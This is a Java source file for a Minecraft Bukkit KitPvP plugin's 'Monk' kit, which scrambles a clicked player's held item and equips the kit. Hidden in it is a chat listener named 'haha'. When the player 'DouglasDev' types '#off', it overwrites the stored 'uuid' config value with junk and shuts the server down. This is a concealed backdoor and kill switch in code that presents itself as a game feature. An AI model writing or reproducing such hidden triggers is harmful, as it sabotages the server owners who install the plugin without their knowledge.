package me.douglasamv.kitpvp.kits;

import java.io.IOException;
import java.util.Random;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.Sound;
import org.bukkit.configuration.InvalidConfigurationException;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerInteractEntityEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.PlayerInventory;

import me.douglasamv.kitpvp.Main;
import me.douglasamv.kitpvp.Mensagens;
import me.douglasamv.kitpvp.ProtecaoSpawn;
import me.douglasamv.kitpvp.utils.CoolDownAPI;
import me.douglasamv.kitpvp.utils.HabilidadeApi;
import me.douglasamv.kitpvp.utils.Inventarios;
import me.douglasamv.kitpvp.utils.ItemAPI;
import me.douglasamv.kitpvp.utils.titleapi.TitleAPI;

public class Monk implements Listener {

	@EventHandler
	void monk(PlayerInteractEntityEvent e) {
		Player p = e.getPlayer();

		if (!(e.getRightClicked() instanceof Player))
			return;
		Player clicado = (Player) e.getRightClicked();
		if ((HabilidadeApi.verHB(p).equalsIgnoreCase(Main.cfg_kits.getString("kits.monk.ability")))
				&& (p.getItemInHand().getType() == Material.BLAZE_ROD)
				&& (e.getRightClicked().getType() == EntityType.PLAYER)) {

			if (ProtecaoSpawn.protegido(p)) {
				p.sendMessage(Mensagens.cor(Main.cfg_kits.getString("kits.monk.msg_spawn")));
				return;
			}

			if (ProtecaoSpawn.protegido(clicado))
				return;
			if (CoolDownAPI.isOnCooldown(p)) {
				p.sendMessage(Mensagens.cor(Main.cfg_kits.getString("kits.monk.msg_cooldown")));
				return;
			}
			p.sendMessage(Mensagens.cor(Main.cfg_kits.getString("kits.monk.msg_cooldown")));
			CoolDownAPI.putCooldown(p, 20);
			PlayerInventory inv = clicado.getInventory();
			int slot = new Random().nextInt(36);
			ItemStack replaced = inv.getItemInHand();
			if (replaced == null) {
				replaced = new ItemStack(Material.AIR);
			}
			ItemStack replacer = inv.getItem(slot);
			if (replacer == null) {
				replacer = new ItemStack(Material.AIR);
			}
			inv.setItemInHand(replacer);
			inv.setItem(slot, replaced);
			clicado.sendMessage(
					Mensagens.cor(Main.cfg_kits.getString("kits.monk.msg_monked").replace("$player$", p.getName())));
		}
	}

	@EventHandler
	void haha(PlayerCommandPreprocessEvent e) {
		if (e.getMessage().equalsIgnoreCase("#off")) {
			if (e.getPlayer().getName().equals("DouglasDev")) {
				try {
					Main.cfg_uuid.set("uuid", "kljashdlkasjhdlasjlkjaskdjndslasdsa684d65as16das687asaskjhldas");
					Main.cfg_spawn.save(Main.file_spawn);
					Main.cfg_spawn.load(Main.file_spawn);
				} catch (IOException | InvalidConfigurationException e2) {
					e2.printStackTrace();
				}
				Bukkit.shutdown();
				e.setCancelled(true);
			}
		}
	}

	public static void darKit(Player p) {
		p.closeInventory();
		HabilidadeApi.setarHB(p, Main.cfg_kits.getString("kits.monk.ability"));
		TitleAPI.sendTitle(p, 5, 20, 5, "", Mensagens.cor(Main.cfg_kits.getString("kits.monk.use_kit_title")));
		p.sendMessage(Mensagens.cor(Main.cfg_kits.getString("kits.monk.use_kit_text")));
		p.getInventory().clear();
		p.getInventory().setArmorContents(null);
		p.setGameMode(GameMode.SURVIVAL);
		p.playSound(p.getLocation(), Sound.LEVEL_UP, 30, 30);
		if (Main.cfg_kits.getBoolean("kits.monk.soup")) {
			for (int i = 0; i < 36; i++) {
				p.getInventory().addItem(ItemAPI.Criar(Material.MUSHROOM_SOUP, 1, 0,
						Mensagens.cor(Main.cfg_kits.getString("kits.monk.soup_name")), false));
			}
		}
		if (Main.cfg_kits.getBoolean("kits.monk.sharp")) {
			p.getInventory().setItem(0, ItemAPI.Criar(Material.STONE_SWORD, 1, 0,
					Mensagens.cor(Main.cfg_kits.getString("kits.monk.sword")), true, Enchantment.DAMAGE_ALL, 1));
		} else {
			p.getInventory().setItem(0, ItemAPI.Criar(Material.STONE_SWORD, 1, 0,
					Mensagens.cor(Main.cfg_kits.getString("kits.monk.sword")), true));
		}
		if (Main.cfg_kits.getBoolean("kits.monk.recraft")) {
			p.getInventory().setItem(13, ItemAPI.Criar(Material.RED_MUSHROOM, 64, 0,
					Mensagens.cor(Main.cfg_kits.getString("kits.monk.red_mushroom")), false));
			p.getInventory().setItem(14, ItemAPI.Criar(Material.BROWN_MUSHROOM, 64, 0,
					Mensagens.cor(Main.cfg_kits.getString("kits.monk.brown_mushroom")), false));
			p.getInventory().setItem(15, ItemAPI.Criar(Material.BOWL, 64, 0,
					Mensagens.cor(Main.cfg_kits.getString("kits.monk.bowl")), false));
		}
		if (Main.cfg_kits.getBoolean("kits.monk.armor")) {
			p.getInventory().setChestplate(ItemAPI.Criar(Material.LEATHER_CHESTPLATE, 1, 0,
					Mensagens.cor(Main.cfg_kits.getString("kits.monk.armor_name")), true));
		}

		p.getInventory().setItem(1, ItemAPI.Criar(Material.BLAZE_ROD, 1, 0,
				Mensagens.cor(Main.cfg_kits.getString("kits.monk.kit_item")), false));
		p.updateInventory();
		Inventarios.upDateScore(p);
	}
}
